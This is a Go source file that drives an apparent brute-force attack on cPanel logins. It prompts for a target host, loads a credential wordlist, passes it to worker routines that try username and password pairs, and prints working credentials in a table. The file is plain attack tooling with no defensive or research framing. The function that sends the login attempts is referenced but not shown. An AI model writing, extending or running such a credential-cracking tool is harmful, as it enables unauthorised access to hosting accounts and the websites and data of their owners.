package cpanelbrute

import (
	"fmt"
	"go_cli/smtpbrute"
	"os"
	"strings"
	"sync"

	"github.com/ncruces/zenity"
	"github.com/olekukonko/tablewriter"
)

func CpanelCrack() {
	var target string
	fmt.Println("Enter the domain name or IP (example: https://website.com:2083 or 127.0.0.1:2083)")
	fmt.Print(">>> ")
	fmt.Scanln(&target)
	trimedTarget := strings.TrimSpace(target)
	fmt.Println("Select your wordlist: ")
	filePath, err := zenity.SelectFile(
		zenity.FileFilters{
			{Patterns: []string{"*.txt"}, CaseFold: false},
		})
	if err != nil {
		fmt.Printf("err: %v\n", err)
	}
	fmt.Printf("filePath: %v\n", filePath)
	wordlist, err := smtpbrute.ReadCredsFromFile(filePath)
	if err != nil {
		fmt.Printf("err: %v\n", err)
		return
	}
	fmt.Printf("Total Credentials: %v\n", len(wordlist))

	maxWorkers := 1
	chunkSize := len(wordlist) / maxWorkers

	if len(wordlist)%maxWorkers != 0 {
		chunkSize++
	}

	wordlistChunks := make(chan []string, chunkSize)

	var mutex sync.Mutex
	var wg sync.WaitGroup
	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader([]string{"Domain", "Username", "Password"})

	for i := 0; i < maxWorkers; i++ {
		wg.Add(1)
		go HandleBrute(trimedTarget, wordlistChunks, &wg, &mutex, table)
	}

	for i := 0; i < len(wordlist); i += chunkSize {
		end := i + chunkSize
		if end > len(wordlist) {
			end = len(wordlist)
		}
		wordlistChunks <- wordlist[i:end]
	}
	fmt.Printf("len(wordlistChunks): %v\n", len(wordlistChunks))
	close(wordlistChunks)
	wg.Wait()
}
